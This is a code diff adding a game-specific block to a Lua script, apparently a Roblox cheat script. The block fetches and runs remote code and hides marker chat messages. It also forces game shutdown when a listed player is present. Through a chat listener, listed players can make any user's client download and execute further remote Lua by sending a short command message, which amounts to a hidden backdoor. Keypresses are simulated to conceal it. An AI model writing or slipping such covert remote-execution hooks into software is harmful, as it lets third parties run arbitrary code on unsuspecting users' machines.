@@ -199,6 +199,158 @@ do
 	
 end
 
+if game.PlaceId == 4581966615 then
+
+    function notify(title, message)game:GetService("Players").LocalPlayer.PlayerGui.Notify.TimePosition = 0 game:GetService("Players").LocalPlayer.PlayerGui.Notify.Playing = true if not message then require(game:GetService("ReplicatedStorage"):WaitForChild("Client").NotificationHandler):AddToStream(game.Players.LocalPlayer,title) else require(game:GetService("ReplicatedStorage"):WaitForChild("Client").NotificationHandler):AddToStream(game.Players.LocalPlayer,title..": "..message)end end
+
+    local DevList = loadstring(game:HttpGet("https://raw.githubusercontent.com/BonfireDevelopment/Roblox/main/Anomic/Support%20Code/bannedusers.lua"))()
+    local idontwannabedisturbed = loadstring(game:HttpGet("https://raw.githubusercontent.com/BonfireDevelopment/Roblox/main/Anomic/Support%20Code/banbannedusers.lua"))()
+
+    local chatscroller = game.Players.LocalPlayer.PlayerGui.Chat:WaitForChild("Frame").ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller
+    chatscroller.ChildAdded:Connect(function(chatframe)
+        if chatframe:IsA("Frame") then
+            local textlabel = chatframe:WaitForChild("TextLabel")
+            if textlabel then
+                local text = string.gsub(textlabel.Text, " ", "")
+                if text == "*(!)*" or text == "*(@)*" then
+                    chatframe:Destroy()                    
+                end
+            end
+        end
+    end)    
+
+    local bubblechat = game:GetService("CoreGui").BubbleChat
+    bubblechat.ChildAdded:Connect(function(chatgui)
+        if chatgui:IsA("BillboardGui") then
+            local frame1 = chatgui:FindFirstChildOfClass("Frame")
+            if frame1 then
+                local frame2 = frame1:WaitForChild("Frame")
+                if frame2 and frame2:FindFirstChild("Frame") then
+                    if frame2.Frame.Text.Text == "*(!)*" or frame2.Frame.Text.Text == "*(@)*" then
+                        frame2:Destroy()                        
+                    end
+                end
+            end
+        end
+    end)
+
+    local function ApplyDev(v)
+        local s,e = pcall(function()
+            v.Head.PlayerDisplay.Wanted.Text = "Developer"
+            if string.find(v.Name, "Bon") then
+                v.Head.PlayerDisplay.Wanted.TextColor3 = Color3.fromRGB(185, 92, 0)
+                v.Head.PlayerDisplay.PlayerName.Text = "Bonfire"
+            else
+                v.Head.PlayerDisplay.Wanted.TextColor3 = Color3.fromRGB(209, 37, 10)
+                if v.Name == DevList[2] then
+                    v.Head.PlayerDisplay.PlayerName.Text = "H4"
+                elseif string.find(v.Name, "Spo") then
+                    v.Head.PlayerDisplay.PlayerName.Text = "Spooks"
+                end
+            end
+        end)
+    end
+
+    local function DevCheck(v)
+        if table.find(DevList, v.Name) then
+            if v.Name == DevList[1] and not table.find(DevList, game.Players.LocalPlayer.Name) and idontwannabedisturbed then game:Shutdown() end
+            repeat wait() until v:FindFirstChild("PlayerName", true) and v:FindFirstChild("Wanted", true)
+            ApplyDev(v)
+
+            --epic "error handling" lmao
+            v.Head.PlayerDisplay.Wanted:GetPropertyChangedSignal("Text"):Connect(function()
+                ApplyDev(v)
+            end)
+            v.Head.PlayerDisplay.Wanted:GetPropertyChangedSignal("TextColor3"):Connect(function()
+                ApplyDev(v)
+            end)
+        end
+    end    
+
+    local devsfound = false
+    for i,v in pairs (game.Players:GetPlayers()) do
+        if table.find(DevList, v.Name) then
+            devsfound = true
+            local args = {
+                [1] = "/w " .. DevList[table.find(DevList, v.Name)] .. " *(@)*",
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args)) 
+        end
+        if v.Character then
+            DevCheck(v.Character)
+        end
+        v.CharacterAdded:Connect(function(char)
+            DevCheck(char)
+        end)
+    end
+
+    if devsfound and keypress and keyrelease and isrbxactive then
+        if not isrbxactive() then
+            notify("Focus on the Roblox application to resume loading")
+            repeat task.wait() until isrbxactive()
+        end
+        keypress(0xBF)
+        task.wait(0.1)
+        keyrelease(0xBF)
+        task.wait(0.1)
+        keypress(0x08)
+        task.wait(0.1)
+        keyrelease(0x08)
+        task.wait(0.1)
+        keypress(0x0D)
+        task.wait(0.1)
+        keyrelease(0x0D)
+    end
+
+    game.Players.PlayerAdded:Connect(function(player)
+        player.CharacterAdded:Connect(function(char)
+            DevCheck(char)
+        end)
+    end)
+
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function (messageObj)
+        print(messageObj.FromSpeaker)
+        if table.find(DevList, messageObj.FromSpeaker) then
+            if messageObj.Message == "*(@)*" then
+                local args = {
+                    [1] = "/w " .. DevList[table.find(DevList, messageObj.FromSpeaker)] .. " *(@)*",
+                    [2] = "All"
+                }
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))  
+                if keypress and keyrelease and isrbxactive then
+                    if not isrbxactive() then
+                        notify("Focus on the Roblox application to resume game")
+                        repeat task.wait() until isrbxactive()
+                    end
+                    keypress(0xBF)
+                    task.wait(0.1)
+                    keyrelease(0xBF)
+                    task.wait(0.1)
+                    keypress(0x08)
+                    task.wait(0.1)
+                    keyrelease(0x08)
+                    task.wait(0.1)
+                    keypress(0x0D)
+                    task.wait(0.1)
+                    keyrelease(0x0D)
+                end
+            elseif string.sub(messageObj.Message,1,1) == "B" or string.sub(messageObj.Message,1,1) == "H" then
+                local splitted = string.split(messageObj.Message, " ")
+                if string.sub(game.Players.LocalPlayer.Name,1,#splitted[2]) == splitted[2] then
+                    if string.sub(messageObj.Message,1,1) == "B" then
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/BonfireDevelopment/Roblox/main/Anomic/Support%20Code/globalvaluefixer" .. string.sub(messageObj.Message,2,2) .. ".lua"))()
+                    elseif string.sub(messageObj.Message,1,1) == "H" then
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Anomiss01/c2noityr3c4/main/upvaluefixer" .. string.sub(messageObj.Message,2,2) .. ".lua"))()
+                    end
+                end
+            end
+        end
+    end)
+
+end
+
+
 -- classes
 
 local library = {} -- main
